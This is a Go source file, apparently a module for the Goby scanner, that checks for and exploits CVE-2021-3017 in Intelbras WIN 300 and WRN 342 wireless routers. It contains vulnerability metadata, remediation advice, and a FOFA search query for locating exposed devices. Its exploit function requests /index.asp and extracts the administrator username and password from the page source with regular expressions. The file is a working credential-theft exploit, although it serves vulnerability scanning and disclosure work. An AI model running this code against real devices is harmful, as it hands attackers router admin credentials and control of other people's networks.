package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Intelbras Wireless Information leakage (CVE-2021-3017)",
    "Description": "The web interface on Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote attackers to discover credentials by reading the def_wirelesspassword line in the HTML source code.",
    "Impact": "Intelbras Wireless Information leakage (CVE-2021-3017)",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.intelbras.com/pt-br/\"> https://www.intelbras.com/pt-br/</a></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "Intelbras Wireless",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Intelbras Wireless index.asp 文件 未授权和密码泄露漏洞 (CVE-2021-3017)",
            "Description": "<p>Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。</p><p>Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。</p>",
            "Impact": "<p>Intelbras Wireless 存在后台账号密码泄露，攻击者可通过泄露的账号密码登录设备管理后台。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.intelbras.com/pt-br/\" rel=\"nofollow\">https://www.intelbras.com/pt-br/</a></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Product": "intelbras-Roteador-intelbras-Wireless",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Intelbras Wireless Information leakage (CVE-2021-3017)",
            "Description": "The web interface on Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote attackers to discover credentials by reading the def_wirelesspassword line in the HTML source code.",
            "Impact": "Intelbras Wireless Information leakage (CVE-2021-3017)",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.intelbras.com/pt-br/\" rel=\"nofollow\"> https://www.intelbras.com/pt-br/</a></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "Intelbras Wireless",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"def_wirelesspassword\"",
    "GobyQuery": "body=\"def_wirelesspassword\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.intelbras.com/pt-br/ajuda-download/faq/roteador-wireless-veloz-wrn-342",
    "DisclosureDate": "2021-04-14",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-3017"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-3017"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202104-1147"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Intelbras Wireless"
        ]
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/index.asp"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("def_PPW = \"(.+?)\";").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/index.asp"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					regexpBodyuser := regexp.MustCompile("def_PUN = \"(.*?)\";").FindStringSubmatch(resp.RawBody)
					regexpBodypass := regexp.MustCompile("def_PPW = \"(.*?)\";").FindStringSubmatch(resp.RawBody)
					expResult.Output = "user:" + regexpBodyuser[1] + "\npass:" + regexpBodypass[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
